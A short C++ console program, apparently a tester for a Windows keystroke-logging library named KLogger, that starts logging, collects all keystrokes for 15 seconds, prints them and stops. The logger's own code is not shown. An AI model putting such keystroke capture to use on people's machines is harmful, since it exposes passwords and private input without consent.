// KLogTester.cpp : Defines the entry point for the console application.
#include "..\Klogger\KLogger.h"
#include "stdafx.h"
#include <windows.h>
#include <fstream>
#include <process.h>
#include <time.h>
#include <sys/types.h>
#include <sys/timeb.h>
#include <string>
#include<iostream>

using namespace std;

int _tmain(int argc, _TCHAR* argv[])
{
	StartLogging();
    char* p = GetAllKeystrokes();
	Sleep(15000);
    puts(p);
    StopLogging();
	std::getchar();
	return 0;
}